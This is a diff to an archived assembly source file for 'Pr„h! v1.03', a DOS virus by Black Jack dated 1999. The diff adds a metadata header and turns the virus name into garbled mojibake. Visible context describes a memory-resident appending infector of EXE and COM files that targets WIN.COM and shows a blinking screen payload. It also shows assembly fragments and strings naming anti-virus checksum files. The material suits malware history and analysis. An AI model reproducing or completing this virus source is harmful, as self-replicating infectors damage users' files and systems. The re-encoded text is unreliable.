@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      P
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; *************************************************************************
 ; ********************                                 ********************
-; ********************           PRŽH! VIRUS           ********************
+; ********************           PRï¿½H! VIRUS           ********************
 ; ********************                by               ********************
 ; ********************            BLACK JACK           ********************
 ; ********************                                 ********************
@@ -8,7 +19,7 @@
 
 comment ~
 
-NAME: Pr„h! v1.03
+NAME: Prï¿½h! v1.03
 AUTHOR: Black Jack
 TYPE: Memory resident appending infector of DOS EXE and COM files.
 SIZE: 1454 bytes in EXEs (plus 7 bytes in COMs plus 17 to 32 padding bytes)
@@ -32,7 +43,7 @@ WINDOWS-COMPATIBLITY: +won't infect windows exe files
 		      +can infect ENUNS com files correctly 
 		      +will directly infect the file %windir%\WIN.COM
 
-PAYLOAD: Yes, it displays a big, red, blinking "PRŽH!" in the center of the
+PAYLOAD: Yes, it displays a big, red, blinking "PRï¿½H!" in the center of the
 	 screen on 27 September of any year.
 
 FLAWS: infected files packed with EXEPACK will return to DOS with the error
@@ -60,7 +71,7 @@ mem_l        = ((offset  end_mem) - (offset start))
 com_start_l  = ((offset end_com_start) - (offset start_for_com))
 encryption_l = ((end_encryption - start_encryption) / 2)
 ping         = 'pr'
-pong         = '„h'
+pong         = 'ï¿½h'
 
 ; *** DIRECTIVES ************************************************************
 .model large
@@ -80,7 +91,7 @@ org 0
 	mov ax, 4C00h                   ; quit program
 	int 21h
 
-message db "Infected with the Pr„h!-virus", 0Ah, 0Dh, "$"
+message db "Infected with the Prï¿½h!-virus", 0Ah, 0Dh, "$"
 
 host_seg ends
 
@@ -352,7 +363,7 @@ restore_com:
 ; ***** STRING CONSTANTS ****************************************************
 
 db 0, "This is the ["
-prah db "PRŽH!] virus, written and (c) by Black Jack, 1999", 0
+prah db "PRï¿½H!] virus, written and (c) by Black Jack, 1999", 0
 
 anti_vir_dat    db "ANTI-VIR.DAT", 0
 chklist_ms      db "CHKLIST.MS", 0
